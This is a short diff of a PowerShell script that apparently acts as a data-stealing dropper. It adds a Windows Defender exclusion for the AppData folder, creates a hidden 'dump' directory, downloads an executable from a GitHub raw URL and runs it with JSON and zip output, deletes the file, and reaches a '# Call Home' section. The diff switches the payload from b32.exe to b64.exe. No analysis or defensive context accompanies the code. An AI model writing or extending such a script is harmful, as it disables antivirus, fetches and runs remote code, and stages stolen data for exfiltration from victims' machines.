@@ -3,10 +3,10 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
-#Downloading and executing b.exe
-Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe'
-.\b32.exe --format json --zip
-Remove-Item -Path "$env:appdata\Microsoft\dump\b32.exe" -Force
+#Downloading and executing b64.exe
+Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b64.exe'
+.\b64.exe --format json --zip
+Remove-Item -Path "$env:appdata\Microsoft\dump\64.exe" -Force
 $Random = Get-Random
 
 # Call Home
